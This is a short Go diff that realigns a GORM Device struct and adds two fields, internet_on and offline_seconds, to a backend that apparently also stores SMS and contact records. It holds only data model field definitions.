@@ -79,16 +79,18 @@ type SmsRecord struct {
 }
 
 type Device struct {
-	ID           uint      `gorm:"primaryKey" json:"id"`
-	CreatedAt    time.Time `json:"created_at"`
-	DeviceID     string    `gorm:"uniqueIndex" json:"device_id"`
-	DeviceName   string    `json:"device_name"`
-	Model        string    `json:"model"`
-	OsVersion    string    `json:"os_version"`
-	AppVersion   string    `json:"app_version"`
-	PhoneNumber  string    `json:"phone_number"`
-	SimInfo      string    `json:"sim_info"`
-	LastSeen     time.Time `json:"last_seen"`
+	ID             uint      `gorm:"primaryKey" json:"id"`
+	CreatedAt      time.Time `json:"created_at"`
+	DeviceID       string    `gorm:"uniqueIndex" json:"device_id"`
+	DeviceName     string    `json:"device_name"`
+	Model          string    `json:"model"`
+	OsVersion      string    `json:"os_version"`
+	AppVersion     string    `json:"app_version"`
+	PhoneNumber    string    `json:"phone_number"`
+	SimInfo        string    `json:"sim_info"`
+	LastSeen       time.Time `json:"last_seen"`
+	InternetOn     bool      `json:"internet_on"`
+	OfflineSeconds int       `json:"offline_seconds"`
 }
 
 type ContactRecord struct {
